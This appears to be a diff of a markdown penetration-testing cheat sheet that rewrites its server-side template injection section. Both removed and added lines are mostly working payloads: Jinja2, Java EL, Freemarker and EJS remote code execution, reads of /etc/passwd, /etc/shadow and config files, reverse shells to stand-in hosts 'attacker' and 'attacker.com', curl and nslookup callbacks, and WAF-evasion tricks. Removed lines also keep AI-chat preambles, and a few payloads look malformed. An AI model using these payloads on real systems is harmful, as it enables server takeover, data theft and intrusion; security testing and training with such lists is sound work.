@@ -2970,436 +2970,93 @@ Processing an unvalidated XSL stylesheet can allow an attacker to change XML str
 - [PayloadsAllTheThings - XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection#tools)
 ---
 ## Template Injection (SSTI)
-> Absolutely, here's the **section-wise SSTI fuzzing parameter list** formatted for automation use — modular, categorized, and ready for integration:
----
-### 🔍 **Generic Parameters**
-```text
-name, username, user, message, comment, bio, description, title, subject, content, search, query, input, data, value, text, email, phone, address, location, city, country, lang, template, theme, style, color
 ```
----
-### 📨 **Form & Submission Parameters**
-```text
-feedback, review, note, reply, post, submit, form, entry, details, remarks
-```
----
-### 🧠 **Logic & Control Parameters**
-```text
-greeting, welcome, status, role, type, mode, level, priority, flag, state, action, option, choice
-```
----
-### 🧱 **Template-Specific Parameters**
-```text
-tpl, tmpl, template_id, template_name, template_type, engine, render, view, layout, partial, fragment
-```
----
-### 🍪 **Cookie Parameters**
-```text
-session, token, auth, user_id, theme, lang
-```
----
-### 🧾 **Header Parameters**
-```text
-User-Agent, Referer, X-Forwarded-For, X-Client-Data, X-Requested-With, X-Template-Engine
-```
----
-### 🧭 **URL/Path Parameters**
-```text
-page, view, id, slug, route, path, endpoint, file, doc, article
-```
----
-
-### 📦 **JSON Keys (for API fuzzing)**
-```json
-"name", "message", "template", "data"
-```
-
-### Tools:
-- [Tplmap](https://github.com/epinna/tplmap)
-
-### Basic Injections:
-#### ERB Engine:
-```erb
 <%= 7 * 7 %>
 <%= File.open('/etc/passwd').read %>
 <%= system('cat /etc/passwd') %>
-```
-
-#### Java:
-```java
-${7*7}
-${class.getClassLoader()}
-${T(java.lang.System).getenv()}
-${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
-```
-
-#### Twig:
-```twig
 {{7*7}}
 {{7*'7'}}
 {{dump(app)}}
-{{app.request.server.all|join(',')}}
-```
-Absolutely, Anvesh! Here's a **complete SSTI test case list with payloads**, aligned with your GitHub methodology and PortSwigger’s lab structure. It’s formatted for clarity and ready to drop into your cheat sheets or automation workflows.
-
----
-
-## 🧪 Server-Side Template Injection (SSTI) — Test Cases with Payloads
-
----
-
-### **1. Basic Expression Evaluation**
-Detects template parsing by evaluating math or string operations.
-
-```text
 {{7*7}}         → 49 (Jinja2, Twig)
 ${7*7}          → 49 (Velocity)
 <%= 7*7 %>      → 49 (EJS)
 #{7*7}          → 49 (Pug)
-```
-
----
-
-### **2. Error-Based Detection**
-Triggers template engine errors to identify backend tech.
-
-```text
 {{7/0}}         → Division error (Jinja2)
 ${7/0}          → Velocity error
 <%= 7/0 %>      → EJS error
-```
-
----
-
-### **3. Template Engine Identification**
-Use engine-specific syntax to fingerprint the backend.
-
-```text
 {{"a"*5}}       → aaaaa (Jinja2)
 ${"a".repeat(5)} → aaaaa (Velocity)
 <%= "a".repeat(5) %> → aaaaa (EJS)
-```
-
----
-
-### **4. Code Execution via SSTI**
-Execute system commands if template engine allows.
-
-```text
-{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}  # Jinja2
-${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}                    # Java (Freemarker)
-<%= require('child_process').execSync('id') %>                                           # Node.js (EJS)
-```
-
----
-
-### **5. File Read via SSTI**
-Access sensitive files using template logic.
-
-```text
-{{ cycler.__init__.__globals__.open('/etc/passwd').read() }}  # Jinja2
-${new java.io.FileReader('/etc/passwd')}                      # Java
-<%= fs.readFileSync('/etc/passwd') %>                         # Node.js
-```
-
----
-
-### **6. Blind SSTI via Time Delay**
-Use time-based payloads to infer execution.
-
-```text
-{{ cycler.__init__.__globals__.os.system('sleep 5') }}        # Jinja2
-${T(java.lang.Thread).sleep(5000)}                            # Java
-<%= require('child_process').execSync('sleep 5') %>           # Node.js
-```
-
----
-
-### **7. SSTI via POST Body**
-Inject payloads into form fields or JSON.
-
-```http
-POST /submit HTTP/1.1
-Content-Type: application/x-www-form-urlencoded
-
-name={{7*7}}
-```
-
----
-
-### **8. SSTI via Headers**
-Inject into `User-Agent`, `Referer`, or custom headers.
-
-```http
-GET / HTTP/1.1
-Host: vulnerable.com
-User-Agent: {{7*7}}
-```
-
----
-
-### **9. SSTI via Cookies**
-Target server-side parsing of cookie values.
-
-```http
-GET / HTTP/1.1
-Host: vulnerable.com
-Cookie: session={{7*7}}
-```
-
----
-
-### **10. SSTI via URL Path or Query**
-Inject directly into path or query parameters.
-
-```http
-GET /hello/{{7*7}} HTTP/1.1
-Host: vulnerable.com
-```
-
----
-
-### **11. SSTI via Template Injection in Logic**
-Manipulate template logic or control flow.
-
-```text
-{{ config.items() }}  # Jinja2
-${applicationScope}   # JSP
-<%= locals %>         # EJS
-```
-
----
-
-### **12. SSTI via Nested Evaluation**
-Use double evaluation to bypass filters.
-
-```text
-{{ '{{7*7}}' }} → {{7*7}} → 49
-```
-
----
-
-### **13. SSTI via Unescaped Output**
-Inject into unescaped template blocks.
-
-```text
-{{ unsafe_variable }}  # If not escaped
-```
-
----
-
-### **14. SSTI via Template Injection in Email/Message**
-Inject into dynamic templates used in emails or notifications.
-
-```text
-Dear {{user.name}}, your balance is {{user.balance}}.
-→ Inject: {{7*7}} → 49
-```
-# **✅ Server-Side Template Injection (SSTI) – Complete Test Case (with Bypass Cases)**
-```
-1.1 Basic SSTI Expression Injection
-1.2 Sandbox Escape in Template Engines
-1.3 Arbitrary Code Execution (RCE)
-1.4 File Read via Template Functions
-1.5 Server-Side Variable Manipulation
-1.6 Template Logic Abuse (Loops, Conditions)
-1.7 Bypass of Filtered Template Syntax
-1.8 Chaining SSTI → LFI → RCE
-1.9 HTML Injection → SSTI (Context Breakout)
-1.10 Framework-Specific Template Engine Exploits (Jinja2, Twig, Freemarker)
-```
-
----
-
-# **2. Sample Payloads (Core Attack Payloads)**
-
-*(Normal structure — non-weaponized education payloads)*
-
-```
-2.1 Basic Injection Test
 {{7*7}}
-```
-
-```
-2.2 Alternative Syntax Injection
 ${7*7}
-```
-
-```
-2.3 Jinja2 Variable Leak
 {{ config }}
-```
-
-```
-2.4 Twig Debug Variable Access
 {{ dump() }}
-```
-
-```
-2.5 JSP / Expression Language (EL)
-${'SSTI'}
-```
-
-```
-2.6 Template Logic Injection
-{{ ["S","S","T","I"]|join("") }}
-```
-
-```
-2.7 Expression-Based Testing
 {{ 1+2 }}
-```
-
-```
-2.8 PHP Smarty Test
-{$smarty.version}
-```
-
----
-
-# **3. Sample Payloads (Updated With Real Payloads for Learning)**
-
-*(Real offensive payloads used for exploitation)*
-
-```
-3.1 Jinja2 RCE Payload
-{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
-```
-
-```
-3.2 Remote Command Execution (Jinja2)
-{{ cycler.__init__.__globals__.os.popen("id").read() }}
-```
-
-```
-3.3 JVM / Spring EL RCE
-${T(java.lang.Runtime).getRuntime().exec('id')}
-```
-
-```
-3.4 Tornado SSTI → File Read
-{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/shadow').read() }}
-```
-
-```
-3.5 Twig RCE via Sandbox Escape
-{{ _self.env.registerUndefinedFilterCallback("system") }}{{ 'id'|system }}
-```
-
-```
-3.6 Python SSTI → Reverse Shell
-{{ cycler.__init__.__globals__.os.system("bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'") }}
-```
-
-```
-3.7 PHP Smarty RCE
-{$smarty.template_object->smarty->security_policy->php_handling = 2}
-```
-
-```
-3.8 Handlebars Prototype Pollution → RCE
-{{#with "constructor"}}{{#with "constructor"}}{{lookup this "global"}}{{/with}}{{/with}}
-```
-
-```
-3.9 Mustache Escape to JS RCE
-{{#payload}}<img src=x onerror=alert(1)>{{/payload}}
-```
-
-```
-3.10 Velocity Template Engine RCE
-#set($x="".getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
-```
-
----
-
-# **4. Bypass Techniques (Filter Bypass, Syntax Obfuscation, WAF Evasion)**
-
-```
-4.1 Whitespace Bypass
 {{7 * 7}}
-```
-
-```
-4.2 Mixed Bracket Bypass
 { { 7*7 } }
-```
-
-```
-4.3 URL Encoded SSTI
 %7B%7B7*7%7D%7D
-```
-
-```
-4.4 Double-Encoded SSTI
 %257B%257B7*7%257D%257D
-```
-
-```
-4.5 Comment-Injection to Bypass Filtering
 {{7*7}}{#comment#}
-```
-
-```
-4.6 Inline Function Bypass
 ${{7*7}}
-```
-
-```
-4.7 Breaking Out of HTML Context
 ">{{7*7}}
 ```
+# 🔹 Detection
 
-```
-4.8 Indirect Access to Globals
-{{ [].__class__.__mro__[1].__subclasses__() }}
-```
+Arithmetic Test : {{7*7}} → Returns 49, confirms SSTI  
+Alt Syntax Test : ${7*7} → Detects Freemarker/EL engines  
+ERB Test : <%=7*7%> → Ruby/ERB execution check  
+Invalid Operation : {{1/0}} → Error-based detection
+Jinja2 Object : {{config}} → Flask/Jinja2 detection  
+Twig Object : {{_self}} → PHP Twig engine  
+Django Object : {{settings}} → Django template engine  
+Freemarker Syntax : ${7*7} → Java Freemarker  
+Velocity Syntax : #set($x=7*7)$x → Java Velocity
 
-```
-4.9 Dotless Global Access (Jinja2 Filter Abuse)
-{{ request|attr("__class__")|attr("__mro__") }}
-```
+# 🔹 Basic Expression Injection
 
-```
-4.10 SSTI via Hidden Fields/JSON Keys
-"template": "{{7*7}}"
-```
+String Output : {{"test"}} → Confirms evaluation  
+Boolean Evaluation : {{7=='7'}} → Type coercion  
 
----
+# 🔹 File Read
 
-# **5. Advanced Attack Chains (Real-World Exploitation)**
+Linux File Read : {{cycler.__init__.__globals__.open('/etc/passwd').read()}} → System file  
+Windows File Read : {{open('C:/Windows/win.ini').read()}} → Windows file  
+Alt Read : {{config.__class__.__init__.__globals__'/etc/passwd'.read()}}
 
-```
-5.1 SSTI → File Read → Credential Theft
-{{ cycler.__init__.__globals__.open('/var/www/app/config.yaml').read() }}
-```
+# 🔹 Remote Code Execution
 
-```
-5.2 SSTI → Code Execution → Reverse Shell
-{{ self.__init__.__globals__.os.system('nc attacker.com 4444 -e /bin/bash') }}
-```
+Basic RCE : {{cycler.__init__.__globals__.os.system('id')}} → Command execution  
+Python Import : {{__import__('os').system('id')}} → Direct execution  
+Subprocess Exec : {{cycler.__init__.__globals__.subprocess.Popen('id',shell=True)}}  
+Freemarker RCE : ${"freemarker.template.utility.Execute"?new()("id")}
+Linux Commands : {{__import__('os').system('whoami')}} → User info  
+List Files : {{__import__('os').system('ls')}} → Directory listing  
+Windows Exec : {{__import__('os').system('whoami')}}
+Time Delay : {{__import__('os').system('sleep 5')}} → Delay detection  
+DNS Callback : {{__import__('os').system('nslookup attacker.com')}}  
+HTTP Callback : {{__import__('os').system('curl attacker.com')}}
 
-```
-5.3 SSTI → Dump Environment Variables
-{{ cycler.__init__.__globals__.os.environ }}
-```
+# 🔹 WAF Bypass
 
-```
-5.4 SSTI → Privilege Escalation
-{{ ''.__class__.__mro__[1].__subclasses__()[150]()._module.__builtins__.open('/root/root.txt').read() }}
-```
+URL Encoding : %7B%7B7*7%7D%7D → Encoded payload  
+Unicode Encoding : \u007b\u007b7*7\u007d\u007d → Filter bypass  
+Whitespace Trick : {{ 7 * 7 }} → Bypass strict filters  
+Newline Injection : {{7%0a*%0a7}} → Break parsing
 
-```
-5.5 SSTI → Access Template Source Code
-{{ self.__init__.__globals__.__file__ }}
-```
+# 🔹 Obfuscation
 
-```
-5.6 SSTI → Database Read (via injected Python)
-{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/mysql/my.cnf').read() }}
-```
-5.7 SSTI → Internal Network Scan
-{{ cycler.__init__.__globals__.os.popen("ping -c 1 127.0.0.1").read() }}
+String Split : {{'o'+'s'}} → Avoid keyword detection  
+Char Build : {{chr(111)+chr(115)}} → Construct "os"  
+Join Trick : {{['o','s']|join}} → Bypass filters
+Pipe Execution : {{7|int}} → Filter usage  
+Attribute Access : {{request.__class__}} → Hidden objects  
+Indirect Access : {{config.items()[0]}}
 
+# 🔹 Context Breaking
+
+Attribute Injection : "{{7*7}}" → Break HTML attribute  
+Node Injection : }}<h1>Injected</h1>{{ → HTML injection + SSTI  
+Template Breakout : ${{7*7}} → Hybrid parsing
 
 # ✅ **LDAP Injection Testcase Names (Names Only)**
 
